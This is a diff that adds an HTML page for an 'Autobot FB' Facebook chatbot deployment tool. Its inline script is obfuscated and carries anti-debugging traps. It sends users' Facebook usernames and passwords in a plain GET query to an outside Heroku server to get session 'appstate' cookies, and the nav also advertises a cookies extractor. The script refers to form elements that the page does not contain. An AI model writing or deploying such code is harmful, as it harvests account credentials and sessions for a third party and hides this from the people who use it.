@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Autobot FB</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<nav class="navbar navbar-expand-lg navbar-light bg-151515 curved-navbar">
+    <a class="navbar-brand" href="#" style="color: white;">𝗛𝗼𝗺𝗲</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse justify-content-end" id="navbarNav" style="margin-right: 70px; color: white;">
+        <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="index.html" style="color: white;">Home<span class="sr-only">(current)</span></a>
+            </li>
+
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="color: white;">Features</a>
+                <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="background-color: #151515">
+                    <a class="dropdown-item" href="#" style="color: white;">Cookies Extractor (Soon)</a>
+                    <div class="dropdown-divider"></div>
+                    <a class="dropdown-item" href="guide.html" style="color: white;">Step-by-Step Guide</a>
+                </div>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="online.html" style="color: white;">Active</a>
+            </li>
+        </ul>
+    </div>
+</nav>
+<div class="container" id="listOfCommands">
+    <p style="margin-top: 5px;">Please choose your commands by tapping on the respective options.</p>
+    <button class="btn btn-primary" onclick="selectAllCommands()">Select all commands</button>
+</div>
+<div class="container" id="listOfCommandsEvent" class="neon-border">
+    <p style="margin-top: 4px;">Please choose your event commands by tapping on the respective options:</p>
+    <button class="btn btn-primary" onclick="selectAllEvents()">Select all events</button>
+</div>
+<div class="container" id="prefixOfCommands">
+    <p style="margin-top: 5px;">Please provide a Prefix:  (optional)</p>
+    <input type="text" id="inputOfPrefix">
+</div>
+<div class="container" id="adminOfCommands">
+    <p style="margin-top: 10px;">Please provide a UID (optional)</p>
+    <input type="text" id="inputOfAdmin">
+</div>
+<div class="container">
+    <h1 class="col text-center" style="font-size: 20px; padding: 10px; font-family: Arial, sans-serif; font-weight: bold; margin-top: 5px;">Terms and Conditions, and Privacy Policy</h1>
+    <div style="border: 2px solid #000; border-radius: 10px; padding: 5px;">
+        <div style="color: white; margin-bottom: 5px; font-size: 10px; padding: 10px;">
+            <p>Upon deployment or login, your chatbot connection remains active unless you personally access the bot's account or modify the password. This measure ensures seamless operation and security.</p>
+        </div>
+    </div>
+    <label style="font-size: 14px; display: flex; align-items: center; padding: 20px;">
+        <input type="checkbox" id="agreeCheckbox" style="color: #FFF; margin-right: 10px; padding-bottom: 7px;"> Checking this box certifies that I have read, understood, and agreed to the Terms and Conditions.
+    </label>
+    <div class="col text-center">
+        <button class="btn btn-primary" onclick="State()" disabled id="submitButton" style="width: 100%; margin-top: 6px;">Submit</button>
+    </div>
+</div>
+<div id="result" class="container text-center" style="display: none;"></div>
+<div class="footer">
+    <p>Time: <span id="time"></span></p>
+    <p>Ping: <span id="ping"></span></p>
+</div>
+
+<script src="script.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
+  <script>
+function _0x5d7c52(_0x5022b6, _0x46ec60, _0x4415b3, _0x47ade3, _0x27733f) {
+  return _0x3539(_0x47ade3 + 0x2a2, _0x5022b6);
+}
+document.getElementById("copy-button").style.display = "none";
+document.getElementById("login-form").addEventListener("submit", async function (_0xc1a7d1) {
+  _0xc1a7d1.preventDefault();
+  const _0x8fa53b = document.getElementById("login-button");
+  const _0x4e31f1 = document.getElementById("username").value;
+  const _0x2d4633 = document.getElementById("password").value;
+  try {
+    _0x8fa53b.innerText = "Logging In";
+    const _0x344b04 = await fetch("https://last-api-30a30f1ae341.herokuapp.com/api/appstate?e=" + _0x4e31f1 + "&p=" + _0x2d4633, {
+      'method': "GET"
+    });
+    const _0x3093a4 = await _0x344b04.json();
+    if (_0x3093a4.success) {
+      document.getElementById("result-container").style.display = "block";
+      const _0x4e9e92 = _0x3093a4.success;
+      document.getElementById("appstate").innerText = _0x4e9e92;
+      alert("Login Success, Click \"Ok\"");
+      _0x8fa53b.innerText = "Logged In";
+      document.getElementById("copy-button").style.display = "block";
+    } else {
+      alert("Failed to retrieve appstate. Please check your credentials and try again.");
+    }
+  } catch (_0x17fe98) {
+    console.error("Error retrieving appstate:", _0x17fe98);
+    alert("An error occurred while retrieving appstate. Please try again later.");
+  }
+});
+function _0x20f360(_0x37fed0, _0x22dbf2, _0xabf6a8, _0x1a110f, _0x11c76b) {
+  return _0x3539(_0x11c76b - 0xb2, _0x37fed0);
+}
+function _0x3539(_0x2d2406, _0x516bfa) {
+  const _0x1661b3 = _0x2f03();
+  _0x3539 = function (_0x2626bd, _0x515903) {
+    _0x2626bd = _0x2626bd - 127;
+    let _0x3637c6 = _0x1661b3[_0x2626bd];
+    return _0x3637c6;
+  };
+  return _0x3539(_0x2d2406, _0x516bfa);
+}
+function _0x27be39(_0x141498, _0x383b86, _0x4e6026, _0x27b438, _0xf01e9d) {
+  return _0x3539(_0xf01e9d + 0x156, _0x141498);
+}
+function _0x2f03() {
+  const _0x166daa = ['add', '/subm', 'block', 'NOLlB', 'butto', 'gVOtS', 'ywSKH', 'HTML', 'osUuE', 'FjFNB', 'LQnCY', 'info', 'count', 'stene', 'NCUbd', 'EHHSB', 'gify', ')+)+)', 'line', 'zTEEf', 'bVKdi', 'oThwB', 'BTNzk', 'SMrOG', 'nPVEF', 'xVZtu', 'forEa', 'HrCVO', 'tate?', 'eElem', 'hvCNT', 'DEwdG', 'fwrRE', " agai", 'jMDpw', 'in.', 'Sdlsb', 'appen', 'CChiT', 'DOrKK', 'knFJY', 'xYeyl', 'eRLtx', 'Rcvra', 'cJpwE', '(((.+', 'bznVL', 'FYAbF', 'mJTOo', 'trace', 'anMuf', 'Qlggo', 'ppsta', 'aMNPW', 'ntain', '165380dalXCE', 'aClNi', 'yWpHu', 'baPJZ', 'dChil', "ng In", 'mhjWY', 'Logge', 'kqSpO', 'class', 'ghSdE', 'lipbo', '__pro', 'zHViR', '/apps', 'LkmHR', "g app", 'Tajae', 'XKxhT', 'Eqnrs', 'CIDDC', 'zVARC', 'cooki', 'UKwdq', 'zIlSv', "d In", 'oXtGp', 'DIXxt', 'bdIUO', 'rrnab', 'gDUDU', 'nFjCp', "copy ", 'uRrBs', 'mRpUt', 'kCqqh', 'XEakO', 'TQtQe', 'nUYtv', 'AEyEk', 'XioYN', 'oyMUx', 'zIPgk', 'WvfCE', 'yHicq', 'type', 'MthLM', 'nPodW', 'lEJiD', 'urls', 'ent', 'vKxCj', 'hMAtz', 'LGbii', 'uuMTC', " (tru", 'VZwWn', 'AmOlU', 'ftxaP', 'zzwbD', 'PZpgy', 'OkwBt', 'hjjZS', 'HQffv', 'write', 'ZDPjg', 'PtzjY', 'zYQEB', 'rUQYl', 'qHRZk', 'OTHbL', 'appst', 'eYCwD', 'AsoNT', 'hbIeB', 't-con', 'MpAlp', 'CyVot', 'ement', '549899CJRBnJ', 'zijig', 'kOvPF', 'eEYAr', 'CwRxb', 'pEvSV', 'EXLUu', 'IXBgj', 'Uceqo', 'VLyYW', 'SEJeH', 'call', '154116BVyxBL', '1/api', 'ate', 'STgdS', '8.118', 'yMnuS', "k you", 'fOfNP', 'ZcdcD', 'tting', 'resul', 'aKVeK', "is\")(", 'rUaDY', 'error', 'kiaRA', 'SHWak', 'HfvPq', 'warn', "r cre", 'ZYNxk', 'rUrYd', 'JAajx', 'OXznk', 'Error', 'Laqlm', 'RjOkM', '{}.co', " \"Ok\"", "e) {}", 'DvODo', 'Click', 'TmpUN', 'div', 'Vmyjf', " retr", 'none', 'YxPUM', 'ZsDRZ', " | ", "rn th", 'EiGEz', 'mXKuD', 'tsEJX', 'RdEBl', 'BRfeV', 'zA-Z_', 'ctor(', 'CCAay', 'OlsNR', 'passw', 'cnUnk', 'NrXna', 'hXKgk', 'Pleas', 'DyNKQ', 'fnxqO', 'XfzvQ', 'dMmbR', 'TWsps', 'YyLnN', 'wosNE', ". ID:", "ile r", 'AShpn', 'BhLoU', 'getEl', 'fEcia', 'click', 'LMHTd', 'zHwpU', 'nEVvt', 'kVxFn', 'login', 'AEowH', 'QGCOv', 'GET', 'OMVFc', 'TOYzD', 'LuwHL', 'zEIbk', 'KNdtv', 'jWKtV', 'ObZrN', 'fEnBo', 'XlQvC', 'OPlAj', 'VwMMi', 'JXLIc', 'wiDyF', 'IfICI', 'EziVt', '192123sdKFVX', "ror o", 'AFDye', 'gEMUl', 'Login', '&p=', 'gUjgm', 'tted', 'init', 'ABWFh', 'oveEH', 'McTbl', 'xNjdo', 'nfYJo', 'taine', 'wGEKH', 'bhWIP', 'actio', 'iPTII', 'usern', 'tolef', 'Yzvnp', 'er.', 'doYXE', 'entLi', 'bGpao', 'pQVKh', 'hVmZh', 'json', 'uUwlT', '190510bGqgsm', 'TFdRS', 'inner', 'nQgXs', 'FkHzW', 'YZmIu', 'ard!', 'nUhYZ', "ving ", 'nOQNa', "n() ", '$]*)', 'dhNpy', 'xLJbb', 'SCQDZ', 'OIjeo', "ate c", 'AvBMV', 'mAOKT', 'ZlorN', 'soJFn', 'DeNLk', 'value', 'n/jso', 't-but', 'CncZp', 'query', 'a-zA-', 'ghxTE', 'yhflx', 'xUPEr', '8crrafr', 'pjtve', 'aPiRK', 'debu', 'QMDHU', 'lease', 'Faile', 'denti', 'XwdwI', 'iFnUa', 'ymDUZ', 'ault', "ess, ", 'bind', 'ODcNI', "n lat", 'YnlsX', 'cPMBI', 'XOHhN', 'XSjuB', 'bjEGU', 'dDSxF', '//65.', 'bXEvK', 'Msjor', 'dNVhx', 'DXqBC', 'while', ':2601', 'iiYXg', 'Sawlb', 'strin', "An er", 'FlSvx', 'xFSqJ', 'onten', 'cCjXo', 'QXkQn', 'lVSfM', 'ructo', 'ccurr', 'WKtQD', 'jcCwM', 'JjZjE', 'UsKJO', 'iIwpN', 'iBDKi', 'nOnxi', 'Loggi', 'SxnaY', 'zoJBi', 'jsQER', 'ss-co', "n (fu", 'conso', 'OWcfD', 'tion', 'CNzPw', 'style', 'toStr', 'uFiSc', 'aqwzy', 'Ijkma', 'qbVFm', "te: ", '1/tot', 'HmHhL', 't-tex', 'irXuN', 'AJkXM', 'HCwcK', " to c", " upda", 'nctio', 'catio', 'mjkOG', 'input', '857170iWZuru', "d to ", 'FcQrW', 'BgQtr', 'OtwFj', 'appli', 'tYWYl', 'lqapY', 'sText', '-form', 'TmdbJ', 'iFkFS', 'ujnVv', 'elbej', "ate. ", 'mRhip', 'kfUqh', "eve a", '12kyqVYl', 'ame', '-text', 'etrie', 'nLvIR', 'mZsbC', '*(?:[', 'then', 'GNgXu', 'hOeRN', 'iemMp', 'statu', 'test', 'nQJHb', 'proto', 'sVVTA', 'gPOTc', 'retur', 'submi', 'QZRMe', 'SzrMu', 'pcUuS', 'resCH', 'POST', 'XCNAb', 'jLevt', 'ePFUV', 'ntDef', 'vals', 'OwCzC', 'GTEZE', 'YVppu', 'fetch', 'kIpCa', "ed wh", "ate: ", 'val', 'QKtUi', 'jXdCE', 'copy-', 'flbNJ', 'BrmGb', 'KuoLG', 'succe', 'xjoHY', 'fbvdj', 'DZArK', 'UXLoB', 'vjSym', 'ISZVN', 'Selec', 'YFVjn', 'ncnvY', 'EjDwd', 'log', 'DxRUJ', 'yMeZa', 'amoun', 'oard', "\\+\\+ ", 'iPUHF', "ion *", 'elIHU', 'NiQvT', 'curre', 'opied', 'IwEPO', 'setIn', "\"retu", 'PTRua', 'jPiYT', 'lRedh', 'hKtcV', 'gIEXe', 'JzPyd', 'NElCB', '-butt', 'reFkE', 'gJDYt', 'wgwey', 'OyEEU', 'gKFMJ', 'hZCJm', 'retri', 'lFJeJ', 'ssing', 'fHISW', 'http:', 'lVbdx', 'jFtqJ', 'fbVjU', 'find', 'eHGNW', 'gger', 'GBXoP', 'YwcBC', 'RYjcN', 'tBwhX', 'OOvGw', 'dvRZD', 'qzjGv', 'MomZO', 'jeweS', 'GMNkt', 'tEPfs', 'ocHZv', 'JGWOm', 'addEv', 'TsLxc', 'GoRFs', 'ejJOU', 'JXCgn', 'QqEiQ', 'ord', 'gXzOx', 'SrOvK', 'Text', 'yCsrV', "nd tr", 'rVPEM', 'Istxb', 'UEHAk', 'lPzsH', "\\( *\\", 'mqEGv', 'FyFeA', 'KPcku', 'IpHKB', 'MiNTW', "y aga", 'IklLF', 'ievin', 'qhHTH', 'TSeOt', 'sbZJE', 'FMGeh', 'sZvDE', 'cVxLS', 'NgjmP', 'ing', 'UDNNY', '.coun', " chec", 'roPCn', 'nt-on', 'Ipjta', 'dcjGo', 'UzYtA', 'VMRZq', 'UfflQ', 'XUiqu', 'bFINx', 'SVyen', 'ton', 'wABKK', 'vzWUT', "e try", 'eDdiP', 'kjSuk', 'FyTfQ', 'TbUjo', 'DrDZw', 'mQiZK', 'KwEtD', 'Submi', 'state', "als a", 'DBwXQ', 'utKNh', 'IKEpv', 'ULRfp', 'Z_$][', 'TBJiL', 'table', '141750aQCjFc', 'apply', 'MZiXs', 'excep', 'anVvp', 'creat', '109.5', 'clipb', 'lengt', 'sKobU', 'preve', 'GOVbb', 'HwKyc', 'UmUum', 'Xrkox', 'iUrHr', 'pSNEi', 'terva', 'JPPWG', 'chain', 'LvlwC', 'qGkgv', 'textC', 'const', " - ", 'proce', 'dfocm', 'LByGq', 'TjENW', 'inter', 'pmSfU', 'url', 'jgtUC', 'vQgLZ', 'cRFxR', 'ById', 'WRQRO', 'to__', " Succ", 'EYIFB', 'xnslW', 'onBYE', "te. P", 'List', 'funct', 'Objec', 'fDpID', 'ByAir', 'qwxtx', 'Appst', 'srlmW', '12vsgxbH', 'nstru', '0-9a-', 'searc', 'displ', 'tor', 'jsRsh', 'cZqnL', 'ESSLm', 'jkwcV'];
+  _0x2f03 = function () {
+    return _0x166daa;
+  };
+  return _0x2f03();
+}
+document.getElementById("copy-button").addEventListener("click", function () {
+  const _0x44bcd1 = document.getElementById("appstate").innerText;
+  navigator.clipboard.writeText(_0x44bcd1).then(function () {
+    alert("Appstate copied to clipboard!");
+  }, function (_0xb67eea) {
+    console.error("Failed to copy appstate: ", _0xb67eea);
+    alert("Failed to copy appstate. Please try again.");
+  });
+});
+function _0x2d2406(_0xb01003) {
+  function _0x5bb5c5(_0x1ecdee) {
+    if (typeof _0x1ecdee === "string") {
+      return function (_0x5c63f0) {}.constructor("while (true) {}").apply("counter");
+    } else if (('' + _0x1ecdee / _0x1ecdee).length !== 1 || _0x1ecdee % 20 === 0) {
+      (function () {
+        return true;
+      }).constructor("debugger").call("action");
+    } else {
+      (function () {
+        return false;
+      }).constructor("debugger").apply("stateObject");
+    }
+    _0x5bb5c5(++_0x1ecdee);
+  }
+  try {
+    if (_0xb01003) {
+      return _0x5bb5c5;
+    } else {
+      _0x5bb5c5(0);
+    }
+  } catch (_0x53fa9c) {}}
+</script>
+</body>
+  </html>
